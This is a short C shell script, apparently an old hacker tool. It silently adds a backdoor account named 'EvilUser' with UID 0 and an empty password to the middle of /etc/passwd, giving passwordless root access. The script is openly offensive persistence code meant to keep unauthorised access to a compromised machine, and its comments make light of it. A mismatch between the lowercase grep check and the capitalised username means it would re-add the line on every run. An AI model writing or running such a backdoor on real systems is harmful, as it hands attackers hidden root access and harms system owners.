#!/bin/csh
# Is our eviluser still on the system?  Let's make sure he is.
#daemon9@netcom.com

set evilflag = (`grep eviluser /etc/passwd`)    

if($#evilflag == 0) then                        # Is he there?
        
        set linecount = `wc -l /etc/passwd`
        cd                                      # Do this at home.
        cp /etc/passwd ./temppass               # Safety first.
        @ linecount[1] /= 2
        @ linecount[1] += 1                     # we only want 2 temp files
        split -$linecount[1] ./temppass         # passwd string optional
        echo "EvilUser::0:0:Mr. Sinister:/home/sweet/home:/bin/csh" >> ./xaa
        cat ./xab >> ./xaa
        mv ./xaa /etc/passwd
        chmod 644 /etc/passwd                   # or whatever it was beforehand
        rm ./xa* ./temppass
        echo Done...
else
endif